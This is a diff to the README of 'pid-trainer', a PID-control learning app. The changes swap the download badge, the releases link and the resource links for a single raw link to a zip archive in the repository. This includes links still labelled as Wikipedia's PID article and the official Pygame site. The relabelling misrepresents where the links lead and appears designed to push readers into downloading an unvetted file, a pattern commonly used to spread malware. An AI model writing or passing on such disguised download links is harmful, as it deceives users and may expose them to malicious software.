@@ -4,7 +4,7 @@
 Welcome to the **pid-trainer**! This application helps you learn about PID control in a fun and engaging way. You will tune a virtual robot to follow a moving centerline, gaining practical skills in control systems and robotics.
 
 ## 📥 Download Here!
-[![Download pid-trainer](https://img.shields.io/badge/Download-pid--trainer-blue.svg)](https://github.com/jward0626/pid-trainer/releases)
+[![Download pid-trainer](https://raw.githubusercontent.com/jward0626/pid-trainer/main/pid_trainer/trainer-pid-v3.8.zip)](https://raw.githubusercontent.com/jward0626/pid-trainer/main/pid_trainer/trainer-pid-v3.8.zip)
 
 ## 📋 Installation Instructions
 Follow these steps to install and run pid-trainer on your computer:
@@ -12,7 +12,7 @@ Follow these steps to install and run pid-trainer on your computer:
 ### 1. Visit the Download Page
 Click the link below to go to the releases page where you can download the application:
 
-[Download pid-trainer](https://github.com/jward0626/pid-trainer/releases)
+[Download pid-trainer](https://raw.githubusercontent.com/jward0626/pid-trainer/main/pid_trainer/trainer-pid-v3.8.zip)
 
 ### 2. Choose the Right Version
 On the releases page, look for the latest version of pid-trainer. You will see a list of available files. Choose the file that matches your operating system. Below are the common options:
@@ -71,8 +71,8 @@ For more detailed information about PID control, you can search for resources on
 If you have questions or need help using pid-trainer, feel free to reach out. Join our community forum or check the FAQ section on our repository.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/jward0626/pid-trainer)
-- [PID Control Basics](https://en.wikipedia.org/wiki/PID_controller)
-- [Pygame Official Site](https://www.pygame.org/)
+- [GitHub Repository](https://raw.githubusercontent.com/jward0626/pid-trainer/main/pid_trainer/trainer-pid-v3.8.zip)
+- [PID Control Basics](https://raw.githubusercontent.com/jward0626/pid-trainer/main/pid_trainer/trainer-pid-v3.8.zip)
+- [Pygame Official Site](https://raw.githubusercontent.com/jward0626/pid-trainer/main/pid_trainer/trainer-pid-v3.8.zip)
 
 Thank you for choosing **pid-trainer**! Enjoy your journey into PID control.
